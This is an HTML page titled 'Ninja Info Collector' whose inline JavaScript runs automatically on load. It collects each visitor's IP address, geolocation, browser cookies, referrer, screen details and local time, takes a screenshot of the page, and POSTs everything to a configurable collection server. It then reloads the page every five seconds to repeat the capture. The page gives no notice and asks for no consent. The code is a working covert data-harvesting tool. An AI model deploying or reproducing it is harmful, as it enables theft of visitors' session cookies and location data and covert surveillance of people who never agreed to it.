<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ninja Info Collector</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", async function() {
            const serverUrl = 'http://localhost:5000'; // Update with your server URL

            // Function to collect data
            async function collectData() {
                try {
                    const ipAddress = await getIPAddress();
                    const geolocation = await getGeolocation();
                    const cookies = getCookies();
                    const referrer = getReferrer();
                    const loadTime = getPageLoadTime();
                    const screenResolution = getScreenResolution();
                    const localTime = getLocalTime();

                    const data = {
                        ip: ipAddress,
                        location: geolocation,
                        cookies: cookies,
                        referrer: referrer,
                        loadTime: loadTime,
                        screenResolution: screenResolution,
                        localTime: localTime
                    };

                    // Send data to the server
                    await sendData(data);
                    await captureScreenshot();
                } catch (error) {
                    console.error('Error collecting data:', error);
                }
            }

            // Fetch IP Address
            async function getIPAddress() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    console.error('Error fetching IP:', error);
                    return 'Error fetching IP';
                }
            }

            // Fetch Geolocation
            async function getGeolocation() {
                return new Promise((resolve) => {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            position => resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            }),
                            error => {
                                console.error('Error fetching geolocation:', error);
                                resolve({ latitude: 'Error', longitude: 'Error' });
                            }
                        );
                    } else {
                        console.error('Geolocation not supported');
                        resolve({ latitude: 'Geolocation not supported', longitude: 'Geolocation not supported' });
                    }
                });
            }

            // Get Cookies
            function getCookies() {
                return document.cookie.split(';').reduce((cookieObject, cookieString) => {
                    const parts = cookieString.split('=');
                    cookieObject[parts[0].trim()] = parts[1] ? parts[1].trim() : '';
                    return cookieObject;
                }, {});
            }

            // Get Referrer
            function getReferrer() {
                return document.referrer || "No referrer";
            }

            // Get Page Load Time
            function getPageLoadTime() {
                return window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart;
            }

            // Get Screen Resolution
            function getScreenResolution() {
                return `${screen.width}x${screen.height}`;
            }

            // Get Local Time
            function getLocalTime() {
                return new Date().toLocaleString();
            }

            // Send data to the server
            async function sendData(data) {
                try {
                    const response = await fetch(`${serverUrl}/logs`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    });
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    const result = await response.json();
                    console.log('Data sent successfully:', result);
                } catch (error) {
                    console.error('Error sending data:', error);
                }
            }

            // Capture Screenshot
            async function captureScreenshot() {
                try {
                    const canvas = await html2canvas(document.body);
                    canvas.toBlob(async function(blob) {
                        const formData = new FormData();
                        formData.append('screenshot', blob, 'screenshot.png');
                        await uploadFile(formData);
                    });
                } catch (error) {
                    console.error('Error capturing screenshot:', error);
                }
            }

            // Upload file
            async function uploadFile(formData) {
                try {
                    const response = await fetch(`${serverUrl}/upload`, {
                        method: 'POST',
                        body: formData
                    });
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    const result = await response.json();
                    console.log('File uploaded successfully:', result);
                } catch (error) {
                    console.error('Error uploading file:', error);
                }
            }

            // Start collecting data
            await collectData();
            setTimeout(() => location.reload(), 5000); // Reload after 5 seconds
        });
    </script>
</head>
<body>
    <h1>Welcome to Ninja Info Collector</h1>
</body>
</html>
